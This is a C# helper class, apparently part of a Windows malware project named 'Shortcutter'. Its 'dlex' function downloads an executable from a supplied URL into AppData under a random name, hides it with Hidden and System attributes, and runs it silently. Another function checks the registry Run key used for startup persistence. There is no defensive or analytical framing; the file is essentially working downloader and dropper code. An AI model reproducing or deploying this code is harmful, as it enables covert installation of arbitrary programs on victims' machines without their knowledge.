using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;

namespace Shortcutter
{
    class Misc
    {
        public static string getLocation()
        {
            string res = Assembly.GetExecutingAssembly().Location;
            if (res == "" || res == null)
            {
                res = Assembly.GetEntryAssembly().Location;
            }
            return res;
        }


        public static string randomString(int length)
        {
            char[] b = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789".ToCharArray();
            Microsoft.VisualBasic.VBMath.Randomize();
            StringBuilder s = new StringBuilder();
            for (int i = 1; i < length; i++)
            {
                int z = ((int)(((b.Length - 2) + 1) * Microsoft.VisualBasic.VBMath.Rnd())) + 1;
                s.Append(b[z]);
            }
            return s.ToString();
        }

        public static bool keyExists(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

        public static bool dlex(string url, string cmdline = "")
        {
            try
            {
                string filename = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + randomString(7) + ".exe";
                WebClient wc = new WebClient();
                wc.Proxy = null;
                wc.DownloadFile(url, filename);
                System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                si.FileName = filename;
                si.Arguments = cmdline;
                File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
                System.Diagnostics.Process.Start(si);
                return true;
            }
            catch
            {
                return false;
            }
        }

    }
}
